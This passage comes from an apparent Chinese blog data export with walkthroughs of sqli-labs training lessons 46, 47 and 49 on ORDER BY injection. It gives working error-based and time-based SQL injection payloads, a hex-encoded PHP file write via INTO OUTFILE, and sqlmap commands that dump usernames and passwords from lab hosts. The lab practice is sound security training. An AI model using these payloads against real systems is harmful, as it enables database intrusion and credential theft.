http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E `\n\n![010](/img/sql/Lesson-46/010.png)\n\n![011](/img/sql/Lesson-46/011.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E --dbs`\n\n\n\n![012](/img/sql/Lesson-46/012.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security --tables`\n\n![013](/img/sql/Lesson-46/013.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security -T users --columns --dump`\n\n![014](/img/sql/Lesson-46/014.png)\n\n","source":"_posts/sqli-labs-lession-46-GET基于错误-数字型-OrderBy注入.md","raw":"---\ntitle: sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入\ndate: 2018-11-04 17:21:03\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-46/001.png)\n\n## 分析\n\n本关的sql语句就是下面的了\n\n`$sql = \"SELECT * FROM users ORDER BY $id\";`\n\n```\norder by 可以加字段名，表达式和字段的位置，字段的位置需要是整数型。不可以跟union。\nORDER BY {col_name | expr | position} \n```\n\norder在之前是用来判断列数的,这里照样。\n\n![002](/img/sql/Lesson-46/002.png)\n\n![003](/img/sql/Lesson-46/003.png)\n\n数字型的当输入正常的列数时会根据列进行排序。\n\n![004](/img/sql/Lesson-46/004.png)\n\n## 注入过程\n\n### 判断字符型\n\n通过desc或者asc排序判断。\n\n![005](/img/sql/Lesson-46/005.png)\n\n判断为数字型\n\n### 报错注入\n\n\n\n本课是有报错的,可以利用报错注入\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))`\n\n![006](/img/sql/Lesson-46/006.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))`\n\n![007](/img/sql/Lesson-46/007.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))`\n\n![008](/img/sql/Lesson-46/008.png)\n\n`http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password) from security.users limit 0,1),0x7e))`\n\n![009](/img/sql/Lesson-46/009.png)\n\n### 时间盲注\n\npayload:\n\n`10.60.250.60/sql/Less-46/?sort=1 and if(1=2, sleep(1), null)`\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E `\n\n![010](/img/sql/Lesson-46/010.png)\n\n![011](/img/sql/Lesson-46/011.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E --dbs`\n\n\n\n![012](/img/sql/Lesson-46/012.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security --tables`\n\n![013](/img/sql/Lesson-46/013.png)\n\n`sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security -T users --columns --dump`\n\n![014](/img/sql/Lesson-46/014.png)\n\n","slug":"sqli-labs-lession-46-GET基于错误-数字型-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf3005t4dsbffwf6fh9","content":"<h1 id=\"sqli-labs-lession-46-GETE基于错误-数字型-OrderBy注入\"><a href=\"#sqli-labs-lession-46-GETE基于错误-数字型-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入\"></a>sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-46/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>本关的sql语句就是下面的了</p>\n<p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p>\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by 可以加字段名，表达式和字段的位置，字段的位置需要是整数型。不可以跟<span class=\"class\"><span class=\"keyword\">union</span>。</span></span><br><span class=\"line\">ORDER BY &#123;col_name | expr | position&#125;</span><br></pre></td></tr></table></figure>\n\n<p>order在之前是用来判断列数的,这里照样。</p>\n<p><img src=\"/img/sql/Lesson-46/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-46/003.png\" alt=\"003\"></p>\n<p>数字型的当输入正常的列数时会根据列进行排序。</p>\n<p><img src=\"/img/sql/Lesson-46/004.png\" alt=\"004\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><h3 id=\"判断字符型\"><a href=\"#判断字符型\" class=\"headerlink\" title=\"判断字符型\"></a>判断字符型</h3><p>通过desc或者asc排序判断。</p>\n<p><img src=\"/img/sql/Lesson-46/005.png\" alt=\"005\"></p>\n<p>判断为数字型</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>本课是有报错的,可以利用报错注入</p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/006.png\" alt=\"006\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/007.png\" alt=\"007\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/008.png\" alt=\"008\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password) from security.users limit 0,1),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/009.png\" alt=\"009\"></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><p>payload:</p>\n<p><code>10.60.250.60/sql/Less-46/?sort=1 and if(1=2, sleep(1), null)</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-46/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-46/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-46/012.png\" alt=\"012\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-46/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-46/014.png\" alt=\"014\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-46-GETE基于错误-数字型-OrderBy注入\"><a href=\"#sqli-labs-lession-46-GETE基于错误-数字型-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入\"></a>sqli-labs-lession 46 GETE基于错误-数字型 OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-46/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>本关的sql语句就是下面的了</p>\n<p><code>$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</code></p>\n<figure class=\"highlight crystal\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by 可以加字段名，表达式和字段的位置，字段的位置需要是整数型。不可以跟<span class=\"class\"><span class=\"keyword\">union</span>。</span></span><br><span class=\"line\">ORDER BY &#123;col_name | expr | position&#125;</span><br></pre></td></tr></table></figure>\n\n<p>order在之前是用来判断列数的,这里照样。</p>\n<p><img src=\"/img/sql/Lesson-46/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-46/003.png\" alt=\"003\"></p>\n<p>数字型的当输入正常的列数时会根据列进行排序。</p>\n<p><img src=\"/img/sql/Lesson-46/004.png\" alt=\"004\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><h3 id=\"判断字符型\"><a href=\"#判断字符型\" class=\"headerlink\" title=\"判断字符型\"></a>判断字符型</h3><p>通过desc或者asc排序判断。</p>\n<p><img src=\"/img/sql/Lesson-46/005.png\" alt=\"005\"></p>\n<p>判断为数字型</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>本课是有报错的,可以利用报错注入</p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,database(),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/006.png\" alt=\"006\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/007.png\" alt=\"007\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/008.png\" alt=\"008\"></p>\n<p><code>http://10.60.250.60/sql/Less-46/?sort=1 and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password) from security.users limit 0,1),0x7e))</code></p>\n<p><img src=\"/img/sql/Lesson-46/009.png\" alt=\"009\"></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><p>payload:</p>\n<p><code>10.60.250.60/sql/Less-46/?sort=1 and if(1=2, sleep(1), null)</code></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E</code></p>\n<p><img src=\"/img/sql/Lesson-46/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-46/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-46/012.png\" alt=\"012\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-46/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u http://10.60.250.60/sql/Less-46/?sort=1 --dbms mysql --technique E -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-46/014.png\" alt=\"014\"></p>\n"},{"title":"sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入","date":"2018-11-05T13:10:11.000Z","_content":"\n# sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-47/001.png)\n\n## 分析\n\ndesc或者asc判断闭合类型,发现为字符型。尝试单引号闭合成功。\n\n## 报错注入\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-47/002.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![003](/img/sql/Lesson-47/003.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![004](/img/sql/Lesson-47/004.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password)from(security.users)limit 0,1),0x7e))%23`\n\n![005](/img/sql/Lesson-47/005.png)\n\n\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 --level 2 --risk 2`\n\n![006](/img/sql/Lesson-47/006.png)\n\n![007](/img/sql/Lesson-47/007.png)\n\n`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 -D security -T users --columns --dump`\n\n直接上结果\n\n![008](/img/sql/Lesson-47/008.png)","source":"_posts/sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入.md","raw":"---\ntitle: sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入\ndate: 2018-11-05 21:10:11\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-47/001.png)\n\n## 分析\n\ndesc或者asc判断闭合类型,发现为字符型。尝试单引号闭合成功。\n\n## 报错注入\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-47/002.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'),0x7e))%23`\n\n![003](/img/sql/Lesson-47/003.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`\n\n![004](/img/sql/Lesson-47/004.png)\n\n`http://10.60.250.239/sql/Less-47/?sort=1' and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password)from(security.users)limit 0,1),0x7e))%23`\n\n![005](/img/sql/Lesson-47/005.png)\n\n\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 --level 2 --risk 2`\n\n![006](/img/sql/Lesson-47/006.png)\n\n![007](/img/sql/Lesson-47/007.png)\n\n`sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 -D security -T users --columns --dump`\n\n直接上结果\n\n![008](/img/sql/Lesson-47/008.png)","slug":"sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf4005w4dsbqzhpryi3","content":"<h1 id=\"sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入\"><a href=\"#sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入\"></a>sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-47/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>desc或者asc判断闭合类型,发现为字符型。尝试单引号闭合成功。</p>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password)from(security.users)limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 --level 2 --risk 2</code></p>\n<p><img src=\"/img/sql/Lesson-47/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-47/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 -D security -T users --columns --dump</code></p>\n<p>直接上结果</p>\n<p><img src=\"/img/sql/Lesson-47/008.png\" alt=\"008\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入\"><a href=\"#sqli-labs-lession-47-GET基于错误-字符型-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入\"></a>sqli-labs-lession 47 GET基于错误-字符型-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-47/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>desc或者asc判断闭合类型,发现为字符型。尝试单引号闭合成功。</p>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/002.png\" alt=\"002\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/003.png\" alt=\"003\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/004.png\" alt=\"004\"></p>\n<p><code>http://10.60.250.239/sql/Less-47/?sort=1&#39; and extractvalue(null,concat(0x7e,(select concat(username,0x7e,password)from(security.users)limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-47/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 --level 2 --risk 2</code></p>\n<p><img src=\"/img/sql/Lesson-47/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-47/007.png\" alt=\"007\"></p>\n<p><code>sqlmap -u http://10.60.250.239/sql/Less-47/?sort=1 --dbms mysql --technique E --threads 20 -D security -T users --columns --dump</code></p>\n<p>直接上结果</p>\n<p><img src=\"/img/sql/Lesson-47/008.png\" alt=\"008\"></p>\n"},{"title":"sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入","date":"2018-11-07T01:05:27.000Z","_content":"\n# sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-49/001.png)\n\n## 分析\n\n一旦遇上字符型,就不是那么好做了,尝试了几种构造方法,发现没有办法构造成布尔型的方式。那么只能采用盲注和into outfile上传。\n\n## 注入\n\n#### into outfile 注入\n\n需要知道路径,使用方式为into outfield \"path\"加上`lines terminated by 16进制转码的数据`\n\n`<?php phpinfo();?> 对应的16进制 3c3f70687020706870696e666f28293b3f3e2020`\n\n![002](/img/sql/Lesson-49/002.png)\n\n### 时间盲注\n\n`http://10.60.250.142:8082/Less-49/?sort=1' and if((select length(database())=8), sleep(1), null)%23`\n\n\n\n![003](/img/sql/Lesson-49/003.png)\n\n有了payload接下来的就可以写个脚本来跑了。\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 --flush-session --fresh-queries`\n\n![004](/img/sql/Lesson-49/004.png)\n\n盲注受网络环境影响较大,直接爆字段吧。\n\n`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 -D security -T users -C username,password --dump  --flush-session --fresh-queries`\n\n![005](/img/sql/Lesson-49/005.png)\n\n![006](/img/sql/Lesson-49/006.png)\n\n","source":"_posts/sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入.md","raw":"---\ntitle: sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入\ndate: 2018-11-07 09:05:27\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-49/001.png)\n\n## 分析\n\n一旦遇上字符型,就不是那么好做了,尝试了几种构造方法,发现没有办法构造成布尔型的方式。那么只能采用盲注和into outfile上传。\n\n## 注入\n\n#### into outfile 注入\n\n需要知道路径,使用方式为into outfield \"path\"加上`lines terminated by 16进制转码的数据`\n\n`<?php phpinfo();?> 对应的16进制 3c3f70687020706870696e666f28293b3f3e2020`\n\n![002](/img/sql/Lesson-49/002.png)\n\n### 时间盲注\n\n`http://10.60.250.142:8082/Less-49/?sort=1' and if((select length(database())=8), sleep(1), null)%23`\n\n\n\n![003](/img/sql/Lesson-49/003.png)\n\n有了payload接下来的就可以写个脚本来跑了。\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 --flush-session --fresh-queries`\n\n![004](/img/sql/Lesson-49/004.png)\n\n盲注受网络环境影响较大,直接爆字段吧。\n\n`sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 -D security -T users -C username,password --dump  --flush-session --fresh-queries`\n\n![005](/img/sql/Lesson-49/005.png)\n\n![006](/img/sql/Lesson-49/006.png)\n\n","slug":"sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.395Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istf500604dsbngnw40o4","content":"<h1 id=\"sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入\"><a href=\"#sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入\"></a>sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-49/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>一旦遇上字符型,就不是那么好做了,尝试了几种构造方法,发现没有办法构造成布尔型的方式。那么只能采用盲注和into outfile上传。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h4 id=\"into-outfile-注入\"><a href=\"#into-outfile-注入\" class=\"headerlink\" title=\"into outfile 注入\"></a>into outfile 注入</h4><p>需要知道路径,使用方式为into outfield “path”加上<code>lines terminated by 16进制转码的数据</code></p>\n<p><code>&lt;?php phpinfo();?&gt; 对应的16进制 3c3f70687020706870696e666f28293b3f3e2020</code></p>\n<p><img src=\"/img/sql/Lesson-49/002.png\" alt=\"002\"></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><p><code>http://10.60.250.142:8082/Less-49/?sort=1&#39; and if((select length(database())=8), sleep(1), null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-49/003.png\" alt=\"003\"></p>\n<p>有了payload接下来的就可以写个脚本来跑了。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-49/004.png\" alt=\"004\"></p>\n<p>盲注受网络环境影响较大,直接爆字段吧。</p>\n<p><code>sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 -D security -T users -C username,password --dump  --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-49/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-49/006.png\" alt=\"006\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入\"><a href=\"#sqli-labs-lession-49-GET-基于错误-字符型盲注-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入\"></a>sqli-labs lession-49 GET-基于错误-字符型盲注-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-49/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>一旦遇上字符型,就不是那么好做了,尝试了几种构造方法,发现没有办法构造成布尔型的方式。那么只能采用盲注和into outfile上传。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><h4 id=\"into-outfile-注入\"><a href=\"#into-outfile-注入\" class=\"headerlink\" title=\"into outfile 注入\"></a>into outfile 注入</h4><p>需要知道路径,使用方式为into outfield “path”加上<code>lines terminated by 16进制转码的数据</code></p>\n<p><code>&lt;?php phpinfo();?&gt; 对应的16进制 3c3f70687020706870696e666f28293b3f3e2020</code></p>\n<p><img src=\"/img/sql/Lesson-49/002.png\" alt=\"002\"></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><p><code>http://10.60.250.142:8082/Less-49/?sort=1&#39; and if((select length(database())=8), sleep(1), null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-49/003.png\" alt=\"003\"></p>\n<p>有了payload接下来的就可以写个脚本来跑了。</p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-49/004.png\" alt=\"004\"></p>\n<p>盲注受网络环境影响较大,直接爆字段吧。</p>\n<p><code>sqlmap -u http://10.60.250.142:8082/Less-49/?sort=1 --technique T --level 2 --risk 2 --dbms mysql --time-sec 2 -D security -T users -C username,password --dump  --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-49/005.png\" alt=\"005\"></p>\n<p><img src=\"/img/sql/Lesson-49/006.png\" alt=\"006\"></p>\n"},{"title":"sqli-labs-lession-5 GET单引号双注入","date":"2018-09-21T09:09:45.000Z","_content":"\n# sqli-labs lession 5 GET单引号双注入 #\n---\n\n## 登录界面 ##\n\n![1](https://i.imgur.com/o5P4i5s.png)\n\n\n## 手注 ##\n输入单引号测试下\n\n`http://10.60.250.181/sqlilabs/Less-5/?id=1%27`\n\n![2](https://i.imgur.com/C2OndYK.png)\n\n返回的错误信息和Lesson-1一样。\n\n`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 